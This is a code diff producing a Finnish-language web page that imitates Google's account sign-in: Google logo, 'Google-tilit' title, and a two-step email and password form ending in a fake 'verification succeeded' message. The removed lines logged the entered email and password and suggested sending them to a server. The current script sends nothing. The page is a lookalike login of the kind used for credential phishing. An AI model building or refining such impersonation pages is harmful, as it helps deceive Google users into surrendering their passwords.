@@ -1,44 +1,173 @@
-<!-- ... kaikki aiempi koodi ennallaan ... -->
-
-<!-- Lisää tämä div login-containerin sisälle, juuri formin jälkeen -->
-<p id="confirmation-message" style="color: green; margin-top: 20px; display: none;">
-  Varmenne onnistui
-</p>
-
-<script>
-  function goToPassword() {
-    const emailInput = document.getElementById('email');
-    const email = emailInput.value.trim();
-
-    if (email === '') {
-      alert('Syötä sähköpostiosoite');
-      return;
+<!DOCTYPE html>
+<html lang="fi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kirjaudu sisään – Google-tilit</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
     }
 
-    // Näytetään salasana-vaihe
-    document.getElementById('email-step').classList.add('hidden');
-    document.getElementById('password-step').classList.remove('hidden');
-    document.getElementById('step-text').textContent = 'Tervetuloa takaisin';
-    document.getElementById('email-display').textContent = email;
-  }
-
-  document.getElementById('login-form').addEventListener('submit', function(e) {
-    e.preventDefault();
-
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-
-    // Tarkista, että salasana ei ole tyhjä
-    if (password.trim() === '') {
-      alert('Syötä salasana');
-      return;
+    .login-container {
+      background: white;
+      width: 360px;
+      padding: 40px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      text-align: center;
     }
 
-    // Piilotetaan lomake ja näytetään varmistusviesti
-    document.getElementById('login-form').style.display = 'none';
-    document.getElementById('confirmation-message').style.display = 'block';
+    .logo {
+      margin-bottom: 20px;
+    }
 
-    // Halutessasi voit myös tulostaa konsoliin tai lähettää tiedot palvelimelle
-    console.log(`Kirjaudutaan sisään sähköpostilla: ${email} ja salasanalla: ${password}`);
-  });
-</script>
+    .logo img {
+      width: 75px;
+    }
+
+    h1 {
+      font-size: 24px;
+      color: #202124;
+      margin-bottom: 8px;
+    }
+
+    p.subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-bottom: 24px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    .button {
+      background-color: #1a73e8;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 10px;
+      float: right;
+    }
+
+    .create-account {
+      text-align: left;
+      margin-top: 20px;
+    }
+
+    .create-account a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .clear {
+      clear: both;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .text-left {
+      text-align: left;
+    }
+
+    #confirmation-message {
+      margin-top: 20px;
+      color: green;
+      font-weight: bold;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    </div>
+    <h1>Kirjaudu sisään</h1>
+    <p class="subtitle" id="step-text">Jatkaaksesi käytä Google-tiliäsi</p>
+
+    <form id="login-form">
+      <!-- Vaihe 1: Sähköposti -->
+      <div id="email-step">
+        <input type="email" id="email" name="email" placeholder="Sähköpostiosoite tai puhelinnumero" required />
+        <button type="button" class="button" onclick="goToPassword()">Seuraava</button>
+      </div>
+
+      <!-- Vaihe 2: Salasana -->
+      <div id="password-step" class="hidden">
+        <p class="text-left" id="email-display"></p>
+        <input type="password" id="password" name="password" placeholder="Syötä salasana" required />
+        <button type="submit" class="button">Kirjaudu</button>
+      </div>
+
+      <div class="clear"></div>
+      <div class="create-account">
+        <a href="#">Luo tili</a>
+      </div>
+    </form>
+
+    <!-- ✅ Tähän tulee varmistusviesti -->
+    <p id="confirmation-message">Varmenne onnistui</p>
+  </div>
+
+  <script>
+    function goToPassword() {
+      const emailInput = document.getElementById('email');
+      const email = emailInput.value.trim();
+
+      // Tarkistus että sähköposti ei ole tyhjä ja sisältää @
+      if (email === '') {
+        alert('Syötä sähköpostiosoite');
+        return;
+      }
+
+      if (!email.includes('@')) {
+        alert('Sähköpostin tulee sisältää @-merkki');
+        return;
+      }
+
+      // Näytetään salasana-vaihe
+      document.getElementById('email-step').classList.add('hidden');
+      document.getElementById('password-step').classList.remove('hidden');
+      document.getElementById('step-text').textContent = 'Tervetuloa takaisin';
+      document.getElementById('email-display').textContent = email;
+    }
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const password = document.getElementById('password').value;
+
+      if (password.trim() === '') {
+        alert('Syötä salasana');
+        return;
+      }
+
+      // Näytetään vahvistusviesti
+      const confirmation = document.getElementById('confirmation-message');
+      confirmation.style.display = 'block';
+    });
+  </script>
+</body>
+</html>
